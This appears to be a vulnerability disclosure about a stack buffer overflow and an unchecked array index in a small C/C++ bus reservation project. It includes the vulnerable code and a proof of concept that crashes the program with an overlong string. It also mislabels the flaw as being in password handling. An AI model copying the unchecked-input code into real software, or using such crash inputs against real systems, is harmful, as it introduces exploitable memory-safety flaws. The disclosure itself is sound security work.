# **Buffer Overflow and Array Index Overflow in Bus Management System**



## supplier

[Simple Bus Reservation System In C Programming With Source Code - Source Code & Projects](https://code-projects.org/simple-bus-reservation-system-in-c-programming-with-source-code/)



## Vulnerability file

- CWE-120 (Buffer Copy Without Size Checking)
- CWE-128 (Wrap-around Error)



## describe

A stack-based buffer overflow vulnerability exists in the password input handling mechanism of the authentication system. The vulnerability allows attackers to cause a denial of service (DoS) and potentially execute arbitrary code by supplying specially crafted long password inputs that exceed the fixed buffer size.



### **Vulnerable Code Segment**

```
bus[10]; // Fixed-size array of 10 elements

void a::install() {
  cout<<"Enter bus no: ";
  cin>>bus[p].busn; // No bounds checking on busn input
  // [...] other inputs
  p++; // No bounds checking on array index
}
```

### **Root Cause Analysis**

#### **1. Buffer Overflow (CWE-120)**

- `bus[p].busn` and other string fields lack input length validation
- No protection against overlong input strings
- Likely uses unsafe C-style strings without proper bounds checking

#### **2. Array Index Overflow (CWE-128)**

- Global variable `p` increments without checking against array size (10)
- After 10 entries, will write out of bounds (`bus[10]` is invalid)
- Could lead to heap/metadata corruption

![image-20250417145212665](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20250417145212665.png)



## POC



enter 1 after   " Enter your choice:- "

![image-20250417145249586](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20250417145249586.png)



enter payload to cause the stack overflow to crash

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```



![image-20250417145412705](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20250417145412705.png)





enter 3 after   " Enter your choice:- "

![image-20250417145456808](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20250417145456808.png)



enter payload to cause the stack overflow to crash

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```



![image-20250417145630970](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20250417145630970.png)



result

we can see EXCEPTION_ACCESS_VIOLATION.

![image-20250417145702163](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20250417145702163.png)